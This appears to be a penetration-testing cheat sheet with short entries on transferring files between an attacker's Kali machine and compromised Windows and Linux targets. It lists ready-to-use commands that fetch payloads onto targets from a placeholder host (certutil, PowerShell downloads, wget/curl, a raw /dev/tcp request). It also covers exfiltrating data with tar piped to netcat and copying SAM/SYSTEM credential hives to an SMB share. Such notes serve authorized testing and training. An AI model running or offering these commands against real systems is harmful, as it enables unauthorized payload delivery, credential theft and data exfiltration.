title: Kali → Windows file transfer
inline_answer:
Kali: `python3 -m http.server 80` (or `servr.sh`). On target:

```
certutil -urlcache -split -f http://KALI/x.exe x.exe
powershell -c "iwr http://KALI/x.exe -OutFile x.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI/x.exe','x.exe')"
```

No HTTP egress? SMB: `copy \\KALI\share\x.exe .` (impacket-smbserver). Last resort: `exe2hex` / base64 paste.

title: Kali → Linux file transfer
inline_answer:
Kali: `python3 -m http.server 80`. On target:

```
wget http://KALI/x -O /tmp/x   ||   curl http://KALI/x -o /tmp/x
# neither installed:
exec 3<>/dev/tcp/KALI/80; echo -e 'GET /x HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/x
```

`chmod +x /tmp/x`. Through a pivot? forward Kali:80 over the tunnel first.

title: Target → Kali (exfiltration)
inline_answer:
```
# Kali listener:
nc -lvnp 4444 > loot.tgz
# target:
tar czf - /path | nc KALI 4444
# or HTTP upload to a Kali server that accepts PUT, or impacket-smbserver + copy,
# or base64 the file and paste it back, then base64 -d on Kali.
```

For SAM/SYSTEM hives use SMB (`copy sam.hive \\KALI\share\`).

title: SMB file transfer (impacket-smbserver)
inline_answer:
```
# Kali (auth share — modern Windows refuses guest):
impacket-smbserver share ./www -smb2support -user a -password a
# Windows target:
net use \\KALI\share /user:a a
copy \\KALI\share\x.exe .          # or copy loot back the same way
```

Best for Windows when HTTP is filtered and for binary integrity (hives, zips).

title: Base64 transfer (no tools needed)
inline_answer:
```
# source:
base64 -w0 file            # (Windows: certutil -encode file b64.txt)
# copy the blob, on the other side:
echo '<blob>' | base64 -d > file
```

For big files split the blob. Survives when there is no wget/curl/scp/smb — only a shell.
